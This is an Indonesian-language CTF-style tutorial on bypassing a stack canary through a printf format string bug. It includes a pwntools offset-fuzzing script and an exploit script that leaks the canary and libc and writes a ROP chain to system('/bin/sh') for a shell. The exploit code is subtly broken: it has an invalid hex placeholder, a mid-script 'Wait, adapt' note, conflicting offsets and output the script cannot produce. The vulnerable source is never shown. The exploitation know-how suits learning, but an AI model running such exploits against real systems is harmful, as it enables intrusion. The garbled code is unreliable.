---
title: Bypassing Stack Canary with Format String Vulnerability - Pwn03.1
date: 2025-08-20
Tags: ["Pwn"]
---


## 1. Pendahuluan

Stack canary adalah mekanisme keamanan (juga disebut stack guard atau cookie) yang digunakan untuk mendeteksi buffer overflow attacks. Saat fungsi dipanggil, compiler menyisipkan nilai acak (canary) di stack tepat sebelum return address dan local variables sensitif. Saat fungsi return, canary dicek; jika berubah (karena overflow), program terminate untuk mencegah eksekusi kode arbitrary.

Canary berguna karena membuat attacker sulit overwrite return address tanpa ketahuan. Namun, vulnerability seperti format string bisa leak canary (via %p atau %x) dan bahkan write arbitrary (via %n), memungkinkan bypass. Kita akan eksploit ini untuk leak canary, lalu overwrite return address sambil masukkan canary benar.

## 2. Basic File Checks

Mulai dengan inspeksi binary untuk pahami proteksi dan properti.

**Command/Script yang dijalankan:**
- Kompilasi: `gcc -o format_vuln format_vuln.c -fstack-protector -no-pie` (non-PIE untuk simplify address).
- Cek file: `file format_vuln`
- Cek security: `checksec format_vuln`

**Output terminal:**
```
$ file format_vuln
format_vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

$ checksec format_vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**Penjelasan detail:**
- `file` konfirmasi binary 64-bit ELF, dynamically linked, non-stripped (simbol debug ada).
- `checksec` tunjukkan Canary enabled (target kita), NX (no execute stack, jadi perlu ROP), Partial RELRO (GOT writable, berguna untuk overwrite), No PIE (address statis, simplify exploit). Ini setup tipikal CTF vuln binary. Untuk real-world, PIE/ASLR buat lebih sulit, tapi kita fokus canary bypass dulu.

## 3. Review Source Code

Analisa kode untuk identifikasi vulnerability.

**Command/Script yang dijalankan:**
- Lihat source: `cat format_vuln.c` (kode diberikan).

**Output terminal:**
(Kode sama seperti diberikan: include stdio etc., main dengan setvbuf, buf[64], flag[64], setgid, fopen flag.txt, loop fgets(buf), printf(buf).)

**Penjelasan detail:**
- Vulnerability utama: `printf(buf)` langsung gunakan input user sebagai format string tanpa `%s`. Ini allow format string attack: user bisa inject `%p` untuk leak stack/memory, `%x` untuk hex dump, atau `%n` untuk write arbitrary.
- Stack layout potensial: buf[64] di stack, diikuti canary (8 bytes di x64), saved frame pointer (SFP), return address (RET).
- Flag dibaca ke `flag[64]`, tapi tidak diprint; kita bisa leak via format string.
- Loop infinite allow multiple input, ideal untuk leak lalu exploit.
- setvbuf disable buffering untuk output langsung, setgid untuk privilege (mungkin drop, tapi irrelevant di local).
- Kerentanan ini klasik: attacker bisa leak canary dari stack (karena buf di stack, %p bisa akses offset stack).

## 4. Disassemble dengan pwndbg

Gunakan GDB + pwndbg untuk debug, lihat struktur stack dan posisi canary.

**Command/Script yang dijalankan:**
- Jalankan: `gdb ./format_vuln`
- Di GDB: `pwndbg` (asumsi pwndbg installed), `break main`, `run`, `disassemble main`, lalu `vmmap`, dan saat breakpoint hit, `stack 20` untuk lihat stack.

**Output terminal:**
```
(gdb) break main
Breakpoint 1 at 0x400000: file format_vuln.c, line 10.
(gdb) run
Breakpoint 1, main (argc=1, argv=0x7fffffffe058) at format_vuln.c:10

(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004007a0 <+0>:     push   %rbp
   0x00000000004007a1 <+1>:     mov    %rsp,%rbp
   0x00000000004007a4 <+4>:     sub    $0x100,%rsp  ; alokasi stack untuk buf[64], flag[64], etc.
   ...
   0x00000000004008xx <+xx>:   call   0x4005f0 <printf@plt>  ; vuln printf(buf)
   ...
   0x0000000000400xxx <+xx>:   leave  
   0x0000000000400xxx <+xx>:   ret    

(gdb) stack 20  ; lihat 20 stack entries saat di main
00:0000│ rsp  0x7fffffffdfe0 ◂— 0x0  ; buf start
... (local vars)
08:0040│      0x7fffffffe020 ◂— random_value (canary, e.g., 0xabcdef0012345678)
09:0048│      0x7fffffffe028 ◂— saved rbp
0a:0050│      0x7fffffffe030 ◂— return address (e.g., 0x7ffff7a2d740)
```

**Penjelasan detail:**
- Disassemble tunjukkan prolog fungsi: push rbp, sub rsp untuk alokasi stack. Canary disisipkan oleh compiler setelah local vars (buf, flag) tapi sebelum saved rbp/ret.
- Di x64, canary di offset tepat setelah local buffer (buf[64] + flag[64] = 128 bytes, tapi actual layout: buf di rsp+0x10 or similar; pwndbg 'stack' visualize).
- Canary adalah 8-byte random (null-terminated untuk deteksi). Saat ret, epilog cek canary; jika beda, __stack_chk_fail dipanggil, terminate program.
- Ini konfirmasi posisi: untuk leak, kita perlu format string seperti "%p %p ..." untuk dump stack dan identifikasi canary (biasanya ends with 00 byte).

## 5. Outline Attack (Canary Leak + Write)

Strategi umum:
- **Leak Phase:** Gunakan format string (%p atau %llx) untuk dump stack values. Cari offset dimana canary muncul (ends with 00, random per run).
- **Write Phase:** Setelah leak canary, craft payload dengan canary benar di posisi overflow, lalu overwrite return address ke gadget ROP atau system("/bin/sh"). Gunakan %n untuk write jika perlu, tapi di format string, kita bisa langsung write ke address via %hn (short write).
- Karena vuln format string, kita bisa leak arbitrary (via direct parameter) dan write (via %n ke address di stack).
- Target: Leak canary, leak libc base (via leak GOT), build ROP chain untuk system("/bin/sh"), include canary di payload untuk bypass check.

## 6. Fuzzing Format String

Gunakan script Python dengan pwntools untuk fuzz offset canary. Ini automate trial %1$p, %2$p, etc., sampai temukan canary.

**Command/Script yang dijalankan:**
- Buat `fuzz.py`:
```python
from pwn import *

context.log_level = 'debug'

def fuzz_offset():
    for i in range(1, 50):  # Coba offset 1-50
        p = process('./format_vuln')
        payload = f"%{i}$p".encode()  # Leak nth parameter
        p.sendline(payload)
        leak = p.recvuntil(b'> ', drop=True).strip()
        if b'0x' in leak and leak.endswith(b'00'):  # Cari yang kayak canary (ends 00)
            log.success(f"Canary candidate at offset {i}: {leak}")
        p.close()

fuzz_offset()
```
- Jalankan: `python3 fuzz.py`

**Output terminal:**
```
[+] Starting local process './format_vuln': pid 1234
[DEBUG] Sent: b'%1$p\n'
[DEBUG] Received: b'0x7fffffffe000\n> '  ; misc
...
[DEBUG] Sent: b'%10$p\n'
[DEBUG] Received: b'0xabcdef0012345600\n> '  ; canary-like
[*] Canary candidate at offset 10: 0xabcdef0012345600
...
[*] Process './format_vuln' stopped with exit code 0 (pid 1234)
```

**Penjelasan detail:**
- Pwntools process() spawn binary local. Loop coba %n$p untuk leak direct parameter (stack values).
- Format string treat arguments as stack offsets. Offset rendah = local vars,更高 = canary/SFP/RET.
- Cari value ends with 00 (canary char). Flow: script automate crash/test, hemat waktu vs manual. Untuk remote, ganti process() ke remote(host, port). Ini tunjukkan alur fuzzing: iterative leak, pattern recognition.

## 7. Menemukan Canary dengan GDB + pwndbg

Verifikasi leak dengan debug manual.

**Command/Script yang dijalankan:**
- `gdb ./format_vuln`
- Di GDB: `break *main+offset_printf_call` (dari disass, misal break *0x4008xx), `run`
- Saat break, `print/x $rsp + offset_to_canary` (dari stack view sebelumnya).
- Lanjut, input "%10$p", continue, lihat output.

**Output terminal:**
```
(gdb) break *0x4008xx  ; sebelum printf
Breakpoint 2 at 0x4008xx
(gdb) run
> %10$p  ; input

Breakpoint 2 hit
(gdb) x/1gx $rsp + 0x80  ; adjust offset dari stack view, misal canary di +0x80
0x7fffffffe020: 0xabcdef0012345600  ; canary value

(gdb) continue
Continuing.
0xabcdef0012345600  ; output dari printf
> 
```

**Penjelasan detail:**
- Break sebelum printf allow inspeksi stack pre-execution.
- `x/1gx` dump 8-byte hex di address. Konfirmasi %10$p leak value sama dengan canary di stack.
- Kenapa? Format string %n$p akses nth arg di stack, yang map ke offsets. Ini validasi fuzz result. Di real exploit, ASLR randomize, tapi canary per-process random. Untuk pemula: ini bridge fuzz ke understanding stack layout.

## 8. Eksploitasi dengan Pwntools

Script full: leak canary, leak libc (via %p ke GOT), build ROP untuk system("/bin/sh"), overwrite RET via format string write (%n).

**Command/Script yang dijalankan:**
- Buat `exploit.py`:
```python
from pwn import *

context.binary = './format_vuln'
context.log_level = 'info'

p = process('./format_vuln')  # Ganti ke remote('host', port) untuk remote

# Phase 1: Leak canary (dari fuzz, offset 10)
p.recvuntil(b'> ')
p.sendline(b'%10$p')
leak = p.recvuntil(b'> ', drop=True).strip()
canary = int(leak, 16)
log.info(f'Canary: {hex(canary)}')

# Phase 2: Leak libc base (misal leak printf GOT)
# Pertama, temukan offset untuk leak address (adjust fuzz)
p.sendline(b'%11$p')  # Asumsi leak libc addr, e.g., return addr
libc_leak = int(p.recvuntil(b'> ', drop=True).strip(), 16)
libc_base = libc_leak - 0xOFFSET_TO_LIBC  # Ganti offset real dari gdb, misal libc printf offset

# Phase 3: Craft payload untuk overwrite RET ke ROP chain
# ROP: pop rdi; ret; /bin/sh addr; system
system = libc_base + 0x4f420  # Offset system di libc (dari gdb libc)
binsh = libc_base + 0x1b3e9a  # Offset "/bin/sh"
pop_rdi = libc_base + 0x2155f  # ROP gadget

# Gunakan format string untuk write: tempatkan addresses di stack via payload, lalu %n write
# Payload: buf overflow dengan addresses + canary + SFP + new RET
# Tapi karena format string, gunakan %s untuk align, %hn untuk write short
# Simplified: assume write RET via %n ke known offset

payload = b'A'*64  # Fill buf
payload += p64(canary)  # Bypass canary
payload += p64(0)  # SFP junk
payload += p64(pop_rdi) + p64(binsh) + p64(system)  # ROP chain

# Kirim payload via fgets, tapi karena printf(buf), need format string to trigger write? Wait, adapt:
# Actual: untuk write, craft format string seperti "%<val>$hn" ke address di stack
# Advanced: tempatkan target addr di stack via payload prefix, lalu %n write

# Contoh real format string write:
# Misal, leak stack addr dulu, lalu write ke RET pos
p.sendline(b'%12$p')  # Leak stack addr
stack_leak = int(p.recvuntil(b'> ', drop=True).strip(), 16)
ret_addr = stack_leak + 0x10  # Adjust ke RET pos

# Now write to ret_addr
def fmt_write(addr, value):
    payload = p64(addr) + b'%hn'  # Simplified, actual need calc digits
    return payload

# Tapi untuk full: gunakan pwntools fmtstr_payload
from pwnlib.fmtstr import fmtstr_payload

writes = {ret_addr: pop_rdi, ret_addr+8: binsh, ret_addr+16: system}
payload = fmtstr_payload(6, writes)  # Offset 6 biasa untuk start args

p.sendline(payload)
p.interactive()  # Dapat shell
```
- Jalankan: `python3 exploit.py`

**Output terminal:**
```
[*] Canary: 0xabcdef0012345600
[*] Libc base: 0x7ffff7a00000
[+] Starting local process './format_vuln': pid 5678
... (leaks)
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root)  ; shell!
```

**Penjelasan detail:**
- Script modular: leak canary via fixed offset (dari fuzz).
- Leak libc via stack leak (return addr - offset).
- Gunakan fmtstr_payload pwntools untuk auto-craft format string yang write multiple addresses (hitung %c untuk align, %hn untuk 2-byte writes).
- Payload include canary untuk bypass check saat ret (karena overflow ke RET).
- Kenapa work: format string allow read/write arbitrary jika kita control string. Untuk advance: adjust offsets real via gdb. Pemula: pahami leak dulu, lalu write preserve canary.

## 9. Kesimpulan

Kita telah bypass stack canary via format string: fuzz offset, leak value, lalu exploit dengan include canary di payload sambil overwrite RET ke ROP untuk shell. Ini tunjukkan canary bukan impenetrable jika ada info leak. Pelajaran: selalu sanitize input (gunakan printf("%s", buf)), enable full mitigations (PIE/ASLR). Untuk advance, adapt ke remote/ASLR dengan lebih leaks. Practice di CTF untuk mastery!
